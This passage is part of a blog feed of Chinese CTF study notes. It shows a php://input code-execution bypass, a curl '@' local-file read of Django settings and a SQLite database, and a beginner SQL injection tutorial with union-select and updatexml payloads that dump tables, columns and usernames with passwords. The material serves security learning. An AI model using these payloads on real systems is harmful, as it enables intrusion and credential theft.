&lt;p&gt;以其他字符替换字符串中的一些字符（区分大小写）。&lt;br&gt;
例如：把字符串 “Hello world!” 中的字符 “world” 替换为 “Shanghai”：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;world&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;Shanghai&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello world!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;本题意思为当传给 page 的参数有 php：// 时替换为空&lt;/p&gt;
&lt;h3 id=&#34;解题步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解题步骤&#34;&gt;#&lt;/a&gt; 解题步骤&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;使用 php：//input&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;构造 URL：?page=Php://input// 大写绕过&lt;br&gt;
使用 bp 传入：&lt;br&gt;
a=&lt;?php system(&#39;ls&#39;);?&gt;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;playload:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a = &amp;lt;?php system(&amp;#x27;cat fl4gisisish3r3.php&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;cat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cat&#34;&gt;#&lt;/a&gt; cat&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;并不是命令注入&lt;/li&gt;
&lt;li&gt;看 wp 得知&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;未过滤字符在 url 栏上会被进行 url 编码&lt;br&gt;
在 url 栏测试宽字符，即 ascii 码超过 127 的 url 编码即可，也就是 %81-% ef&lt;br&gt;
 发现任意一个宽字符，都会出现报错信息&lt;br&gt;
&lt;em&gt;这道题有关一个 djiango 特性和 php 特性，没看懂。&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;解题步骤：&lt;br&gt;
playload1：?url=%80, 发现报错，url 编码使用的是 16 进制，80 也就是 128，ASCII 码是从 0-127，所以这个时候会报错。&lt;br&gt;
&lt;strong&gt;php 特性&lt;/strong&gt;：&lt;br&gt;
WP 得知 php 的 curl 组件请求加上 @会读取文件，读取 settings.py 文件获取数据库名称&lt;/li&gt;
&lt;li&gt;构造 playload2：&lt;br&gt;
?url=@/opt/api/api/settings.py &lt;em&gt;读取配置文件&lt;/em&gt;&lt;br&gt;
 Ctrl+f 搜索 database&lt;/li&gt;
&lt;li&gt;构造 playload3：&lt;br&gt;
?url=@/opt/api/database.sqlite3&lt;br&gt;
 &lt;code&gt;搜索flag/ctf可得flag&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;最后的flag竟然不包含前面的A&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="ctf" />
        <updated>2023-04-14T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://starofeden.github.io/2023/03/25/sql%E6%B3%A8%E5%85%A5/</id>
        <title>sql注入</title>
        <link rel="alternate" href="https://starofeden.github.io/2023/03/25/sql%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;h1 id=&#34;从0开始的sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从0开始的sql注入&#34;&gt;#&lt;/a&gt; &lt;strong&gt;从 0 开始的 sql 注入&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&#34;burpsuite-fuzz&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burpsuite-fuzz&#34;&gt;#&lt;/a&gt; burpsuite fuzz&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Fuzz testing 是生成大量数据并且对系统产生大量异常请求，通过大量恶意请求查找漏洞。在这个过程中我们可以依赖于部分工具来实现参数化，本文以 burpsuite 为工具以文件上传为例，可用此爆破过滤的关键字&lt;/li&gt;
&lt;li&gt;遇到的问题：&lt;br&gt;
在爆破时遇到报错：Too Many Reqests!&lt;br&gt;
 将线程数改为 1，时间间隔改小一点&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;查询所有数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询所有数据&#34;&gt;#&lt;/a&gt; 查询所有数据：&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1 or 1=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;常用语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常用语句&#34;&gt;#&lt;/a&gt; 常用语句&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;常用函数：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;database()	//查询数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;user()		//当前数据库用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;version()	//MySQL 版本&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;爆表&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;爆字段名&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#x27;users&amp;#x27;--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;相应字段内容&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,group_concat(id,&amp;#x27;:&amp;#x27;,username,&amp;#x27;:&amp;#x27;,password) from users --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;1sql基本语法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1sql基本语法&#34;&gt;#&lt;/a&gt; 1.sql 基本语法&lt;/h2&gt;
&lt;h3 id=&#34;11-sql-select&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11-sql-select&#34;&gt;#&lt;/a&gt; 1.1 sql select&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; column1,column2 &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; table_name;     &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;从表中选取列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; table_name;       &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;从表中选取所有列&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;column：(列) 字段名&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;12-where子句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#12-where子句&#34;&gt;#&lt;/a&gt; 1.2 where 子句&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WHERE 子句用于提取那些满足指定条件的记录。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; websites &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; coutry &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;CN&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;字符要用单引号括起来，数字不用&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;13-and-or运算符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#13-and-or运算符&#34;&gt;#&lt;/a&gt; 1.3 AND &amp;amp; OR 运算符&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;and&lt;/td&gt;
&lt;td&gt;显示两个条件都成立的记录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;or&lt;/td&gt;
&lt;td&gt;两个条件只要有一个成立，就显示其记录&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;14-order-by&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#14-order-by&#34;&gt;#&lt;/a&gt; 1.4 order by&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ORDER BY 关键字用于对结果集进行排序。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; column1, column2 &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; table_name &lt;span class=&#34;keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;BY&lt;/span&gt; column1, column2, ... &lt;span class=&#34;keyword&#34;&gt;ASC&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;DESC&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;column1,column2&lt;/strong&gt;: 要排序的字段名&lt;br&gt;
&lt;strong&gt; ASC&lt;/strong&gt;：表示按升序排序。&lt;br&gt;
&lt;strong&gt;DESC&lt;/strong&gt;：表示按降序排序。&lt;br&gt;
&lt;em&gt;默认为升序&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-mysql知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-mysql知识点&#34;&gt;#&lt;/a&gt; 2. mysql 知识点&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;union select&lt;/td&gt;
&lt;td&gt;联合查询，判断哪些地方可被替代，并在网页上显示出来&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;database()&lt;/td&gt;
&lt;td&gt;回显当前数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;version()&lt;/td&gt;
&lt;td&gt;查看当前竖起来版本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;group_concat()&lt;/td&gt;
&lt;td&gt;把产生的同一分组中的值用，连接，形成一个字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;information_schema&lt;/td&gt;
&lt;td&gt;存了很多 mysql 信息的数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;联合查询&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#联合查询&#34;&gt;#&lt;/a&gt; 联合查询：&lt;/h3&gt;
&lt;p&gt;当联合查询的数据不存在时就会创造一个虚拟数据，如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;C:%5CUsers%5Cdell%5CDesktop%5C%E7%AC%94%E8%AE%B0%5C7e5d981f76a54e22b2ce3b6a13287b46.png&#34; alt=&#34;7e5d981f76a54e22b2ce3b6a13287b46&#34;&gt;&lt;br&gt;
 若后端查询语句是先通过查询用户名再进行密码的判断，就可以生成一个虚拟的密码，然后就可以通过查询的虚拟数据生成的密码来登录&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通常密码被 md5 加密，可传入 md5 加密后的密码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;23可以代替&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23可以代替&#34;&gt;#&lt;/a&gt; &lt;strong&gt;%23 可以代替#&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;information_schema.schemata&lt;/strong&gt;        information_schema 库的一个表，名为 schemata, 存储数据库名的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;schema_name&lt;/strong&gt;:schemata 表中存储 mysql 所有数据库名字的字段&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;information_schema.tables&lt;/strong&gt; 存了 mysql 所有的表名&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TABLE_SCHEMA 表示表所属的数据库名称；&lt;/li&gt;
&lt;li&gt;TABLE_NAME 表示所属的表的名称&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;information_schema.columns&lt;/strong&gt;  表存了所有的列的信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;COLUMN_NAME 表示字段名，当你知道一个表的名字时，可通过此字段获得表中的所有字段名 (列名)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;关于 and 1=2  &lt;strong&gt;用来判断是数字型注入还是字符型注入&lt;/strong&gt;&lt;br&gt;
 &lt;code&gt;若在GET请求中?id=1 and 1=1和?id=1 and 1=2都没有报错，则是字符型注入。&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;若id=1 and 1=1没有报错，但是?id=1 and 1=2有异常或没回显，则是数字型注入。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3搜索型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3搜索型注入&#34;&gt;#&lt;/a&gt; 3. 搜索型注入&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select from 表名 where username like &amp;#x27; %k% &amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;构造闭合：%’&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4insert注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4insert注入&#34;&gt;#&lt;/a&gt; 4.insert 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;语句：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into member(username,pw,sex,phonenum,email,address) values(&amp;#x27;必填字段&amp;#x27;,&amp;#x27;必填字段&amp;#x27;,&amp;#x27;xx&amp;#x27;,&amp;#x27;xx&amp;#x27;,&amp;#x27;xx&amp;#x27;,&amp;#x27;xx&amp;#x27;,&amp;#x27;xx&amp;#x27;,)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;playload:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bob&amp;#x27; or updatexml(1,concat(0x7e,database()),0) or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;5盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5盲注&#34;&gt;#&lt;/a&gt; 5. 盲注&lt;/h2&gt;
&lt;h3 id=&#34;31报错注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31报错注入&#34;&gt;#&lt;/a&gt; 3.1 报错注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;delete/update/insert&lt;/li&gt;
&lt;li&gt;使用条件：页面有数据库的报错信息&lt;/li&gt;
&lt;li&gt;判断是否报错&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; -- a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;相关知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#相关知识&#34;&gt;#&lt;/a&gt; 相关知识：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;updatexml&lt;/strong&gt;&lt;br&gt;
updatexml(xml_doument,XPath_string,new_value)&lt;br&gt;
 第一个参数：XML 的内容&lt;br&gt;
第二个参数：是需要 update 的位置 XPATH 路径&lt;br&gt;
第三个参数：是更新后的内容&lt;br&gt;
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式&lt;/li&gt;
&lt;li&gt;0x7e 为符号’~&#39;，因为不符合 xpath 语法，因此会报错，并把校验失败的东西爆出来。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;一些名词&lt;br&gt;
 &lt;code&gt;column_name:列的名称&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;Information_schema.columns:表示所有的列的信息&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;Information_schema:表示所有信息，包括库、表、列&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;Information_schema.tables:表示所有的表的信息&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;table_schema:数据库的名称&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;table_name:表的名称&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;注入方式：&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;查库&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; updataxml(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;,database(),&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;查表&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; updatexml(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;,(&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; (group_concat(table_name)) &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;database()),&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;查列名&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; updatexml(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;,(&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; (group_concat(column_name)) &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_name&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;查 flag 列内容&lt;/li&gt;
&lt;/ul&gt;
